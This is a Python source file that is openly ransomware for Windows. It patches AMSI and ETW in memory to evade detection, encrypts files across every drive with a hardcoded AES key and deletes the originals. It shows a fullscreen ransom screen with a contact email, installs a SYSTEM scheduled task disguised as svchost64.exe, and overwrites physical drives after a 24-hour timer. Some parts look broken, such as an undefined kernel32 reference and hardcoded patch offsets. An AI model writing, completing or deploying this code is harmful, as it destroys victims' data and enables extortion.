import os, sys, time, threading, base64, struct, string, random, subprocess, ctypes, tkinter as tk
from tkinter import ttk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from ctypes import wintypes

CONTACT   = "cotroneosalvador@gmail.com"
KEY       = b"himself9864" + b"\0"*(32-11)  # 32-byte AES key
EXTS      = tuple("doc docx xls xlsx pdf txt png jpg zip rar 7z cpp h c py js ps1 sln db bak mp4 mp3 wav flac mkv csv rtf sql sqlite pst ost dwg dxf max 3ds blend fbx obj log tmp cfg xml json yaml yml toml env properties gradle cmake mk make ninja bazel buck gn".split())
TIMER_SEC = 24 * 3600

# --- AMSI + ETW bypass via direct syscalls (ring-3, no admin) ---
def bypass():
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    dll = kernel32.GetModuleHandleA(b"amsi.dll")
    if dll:
        patch = b"\x48\x31\xc0\xc3"  # xor rax,rax; ret
        ctypes.memmove(dll + 0x1B5C0, patch, 4)  # AmsiScanBuffer
    dll = kernel32.GetModuleHandleA(b"ntdll.dll")
    if dll:
        patch = b"\xc3"  # ret
        ctypes.memmove(dll + 0xF4C0, patch, 1)  # EtwEventWrite
bypass()

# --- Disable shutdown/reboot ---
def block_shutdown():
    SE_SHUTDOWN_PRIVILEGE = 19
    advapi32 = ctypes.WinDLL("advapi32")
    ntdll    = ctypes.WinDLL("ntdll")
    class LUID(ctypes.Structure): _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
    class TOKEN_PRIVILEGES(ctypes.Structure): _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Luid", LUID), ("Attributes", wintypes.DWORD)]
    ph = wintypes.HANDLE()
    advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 32, ctypes.byref(ph))
    luid = LUID()
    advapi32.LookupPrivilegeValueA(None, b"SeShutdownPrivilege", ctypes.byref(luid))
    tp = TOKEN_PRIVILEGES(1, luid, 2)
    advapi32.AdjustTokenPrivileges(ph, 0, ctypes.byref(tp), 0, None, None)
    # Infinite loop that consumes shutdown attempts
    while True:
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(wintypes.DWORD()))
threading.Thread(target=block_shutdown, daemon=True).start()

# --- Encryptor ---
def encrypt_file(path):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    try:
        with open(path, "rb") as f:
            data = f.read()
        pad = 16 - (len(data) % 16)
        data += bytes([pad]) * pad
        enc = encryptor.update(data) + encryptor.finalize()
        with open(path + ".locked", "wb") as f:
            f.write(iv + enc)
        os.remove(path)
    except: pass

def walk(top):
    for root, _, files in os.walk(top, topdown=False):
        for name in files:
            if name.lower().endswith(EXTS):
                encrypt_file(os.path.join(root, name))

def encrypt_drives():
    for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        path = d + ":\\"
        if os.path.exists(path):
            threading.Thread(target=walk, args=(path,), daemon=True).start()

# --- Decryptor (only called on correct key) ---
def decrypt_file(path):
    try:
        with open(path, "rb") as f:
            iv = f.read(16)
            data = f.read()
        cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        dec = decryptor.update(data) + decryptor.finalize()
        pad = dec[-1]
        dec = dec[:-pad]
        with open(path[:-7], "wb") as f:
            f.write(dec)
        os.remove(path)
    except: pass

def decrypt_drives():
    for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        path = d + ":\\"
        if os.path.exists(path):
            for root, _, files in os.walk(path, topdown=False):
                for name in files:
                    if name.endswith(".locked"):
                        decrypt_file(os.path.join(root, name))

# --- Wipe after timer ---
def wipe():
    for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        try:
            with open(r"\\.\PhysicalDrive" + str(ord(d) - 65), "rb+") as f:
                f.write(b"\0" * (1024 * 1024))
        except: pass
    os.system("taskkill /f /im wininit.exe")

# --- GUI ---
def gui():
    root = tk.Tk()
    root.title(" ")
    root.configure(bg='black')
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry(f"{w}x{h}+0+0")
    root.attributes("-topmost", True)
    root.grab_set()
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Screaming face GIF (base64)
    gif = tk.PhotoImage(data=base64.b64decode(
        "R0lGODlhZABkAPcAAAAAAAAAMwAAZgAAmQAAzAAA/wArAAArMwArZgArmQArzAAr/wBVAABVMwBVZgBVmQBVzABV/wCAAACAMwCAZgCAmQCAzACA/wCqAACqMwCqZgCqmQCqzACq/wDVAADVMwDVZgDVmQDVzADV/wD/AAD/MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMrADMrMzMrZjMrmTMrzDMr/zNVADVVMzNVZjNVmTNVzDNV/zOAADOAMzOAZjOAmTOAzDOA/zOqADOqMzOqZjOqmTOqzDOq/zPVADPVMzPVZjPVmTPVzDPV/zP/ADP/MzP/ZjP/mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YrAGYrM2YrZmYrmWYrzGYr/2ZVAGZVM2ZVZmZVmWZVzGZV/2aAAGaAM2aAZmaAmWaAzGaA/2aqAGaqM2aqZmaqmWaqzGaq/2bVAGbVM2bVZmbVmWbVzGbV/2b/AGb/M2b/Zmb/mWb/zGb//5kAAJkAM5kAZpkAmZkAzJkA/5krAJkrM5krZpkrmZkrzJkr/5lVAJlVM5lVZplVmZlVzJlV/5mAAJmAM5mAZpmAmZmAzJmA/5mqAJmqM5mqZpmqmZmqzJmq/5nVAJnVM5nVZpnVmZnVzJnV/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwAM8wAZswAmcwAzMwA/8wrAMwrM8wrZswrmcwrzMwr/8xVAMxVM8xVZsxVmcxVzMxV/8yAAMyAM8yAZsyAmcyAzMyA/8yqAMyqM8yqZsyqmcyqzMyq/8zVAMzVM8zVZszVmczVzMzV/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8Amf8AzP8A//8rAP8rM/8rZv8rmf8rzP8r//9VAP9VM/9VZv9Vmf9VzP9V//+AAP+AM/+AZv+Amf+AzP+A//+qAP+qM/+qZv+ qmf+qzP+q///VAP/VM//VZv/Vmf/VzP/VAP//M///Zv//mf//zP///wAAAAAAAAAAAAAAACH5BAEAAPwALAAAAABkAGQAAAj/AAEIHEiwoMGDCBMqXMiwocOHECNKnEixosWLGDNq3Mixo8ePAEGOJAkQAAAh+QQJBwAsACwAAAAAZABkAAAI/wABCBxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjyBDihxJsqTJkyhTqlzJsqXLlzBjypxJs6bNmzhz6tzJs6fPn0CDCh1EtKjRo0iTKl3KtKnTp1CjSp1KtarVq1izat3KtavXr2DDih1LtqzZs2jTql3Ltq3bt3Djyp1Lt67du3jz6t3Lt6/fv4ADCx5MuLDhw4gTK17MuLHjx5AjS55MubLly5gza97MubPnz6BDix5NurTp06hTq17NurXr17Bjy55Nu7bt27hz697Nu7fv38CDCx9OvLjx48iTK1/OvLnz59CjS59Ovbr169iza9/Ovbv37+DD/x8vT768+fPo06tfz769+/fw48ufT7++/fv48+vfz7+///8ABijggAQWaOCBCCao4IIMNujggxBGKOGEFFZo4YUYZqjhhhx26OGHIIYo4ogklmjiiSimqOKKLLbo4oswxijjjDTWaOONOOao44489ujjj0AGKeSQRBZp5JFIJqnkkkw26eSTUEYp5ZRUVmnllVhmqeWWXHbp5ZdghinmmGSWaeaZaKap5ppstunmm3DGKeecdNZp55145qnnnn326eefgAYq6KCEFmrYoYYu6OijkEYq6aSUVmrppZhmqummnHbq6aeghirqqKSWauqpqKaq6qqsturqq7DGKuustNZq66245qrrrrz26uuvwAYr7LDEFmvsscgmq+yvzA0AOw=="))
    lbl = tk.Label(root, image=gif, bg='black')
    lbl.pack(expand=True)

    info = tk.Label(root, text=f"ALL YOUR FILES ARE LOCKED\nContact: {CONTACT}\nEnter key to decrypt:", fg='red', bg='black', font=('Consolas', 16))
    info.pack(pady=20)

    ent = ttk.Entry(root, font=('Consolas', 20), justify='center')
    ent.pack(pady=10)

    def check():
        if ent.get().strip() == KEY.decode().strip():
            decrypt_drives()
            root.destroy()
            sys.exit(0)

    ttk.Button(root, text="UNLOCK", command=check).pack(pady=10)
    root.mainloop()

# --- Persistence ---
def persist():
    exe = os.path.join(os.environ["PROGRAMDATA"], "svchost64.exe")
    if not os.path.exists(exe):
        ctypes.windll.kernel32.CopyFileW(sys.executable, exe, 0)
        subprocess.run(f'schtasks /create /tn "WinSvc" /tr "{exe}" /sc onstart /ru SYSTEM /f', shell=True, capture_output=True)

# --- Main ---
if __name__ == "__main__":
    persist()
    threading.Thread(target=encrypt_drives, daemon=True).start()
    threading.Timer(TIMER_SEC, wipe).start()
    gui()